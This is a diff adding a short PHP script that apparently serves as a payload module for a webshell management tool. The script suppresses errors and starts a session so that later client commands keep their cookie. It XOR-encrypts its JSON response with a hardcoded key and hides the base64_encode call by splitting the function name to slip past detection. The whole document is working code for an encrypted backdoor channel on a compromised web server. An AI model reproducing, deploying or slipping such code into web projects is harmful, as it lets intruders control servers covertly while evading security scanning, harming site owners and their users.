@@ -1,0 +1,23 @@
+@error_reporting(0);
+function main($content)
+{
+	$result = array();
+	$result["status"] = base64_encode("success");
+    $result["msg"] = base64_encode($content);
+    @session_start();  //初始化session，避免connect之后直接background，后续getresult无法获取cookie
+
+    echo encrypt(json_encode($result));
+}
+
+function Encrypt($data)
+{
+    $key="e45e329feb5d925b"; 
+	for($i=0;$i<strlen($data);$i++) {
+    	$data[$i] = $data[$i]^$key[$i+1&15]; 
+    }
+    $bs="base64_"."encode";
+	$after=$bs($data."");
+    return $after;
+}
+$content="czA2U2J2bktaVWk5M3h2cFFHSDlTNVA0N2w0RTAxRXROZUpoMzVRSm1Mano1";$content=base64_decode($content);
+main($content);
